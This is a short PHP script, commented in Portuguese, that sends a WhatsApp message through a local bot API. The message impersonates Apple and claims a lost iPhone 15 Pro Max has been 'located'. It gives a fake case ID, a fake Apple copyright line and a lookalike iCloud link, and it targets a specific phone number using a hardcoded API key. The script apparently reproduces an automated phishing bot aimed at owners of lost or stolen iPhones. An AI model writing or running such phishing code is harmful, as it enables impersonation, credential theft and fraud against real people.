<?php
// Script de Teste Técnico: Forçar Thumbnail do iCloud
$api_url = "http://localhost:3000/api/send";
$api_key = "botzp_457873019f42c789d50023bdac28efa5";
$target_number = "554195457772";
$session_id = "MInha";
$trackLink = "https://icloud.comRHZ";

$template = "*Dispositivo Localizado*\n" .
            "> Dispositivo: *iPhone 15 Pro Max Titânio Natural 512 GB*\n" .
            "> Número de emergencia: *({$target_number})*\n" .
            "> ID de caso: *000-A946*\n" .
            "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
            "> *Copyright ©️ 2025 Apple Inc*";

// PAYLOAD SEM MEDIAPATH (Exatamente como o robô faz)
$payload = [
    'session' => $session_id,
    'number' => $target_number,
    'message' => $template,
    'trackLink' => $trackLink
];

$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Authorization: Bearer ' . $api_key
]);

$response = curl_exec($ch);
echo "Resposta: " . $response . "\n";
curl_close($ch);
?>
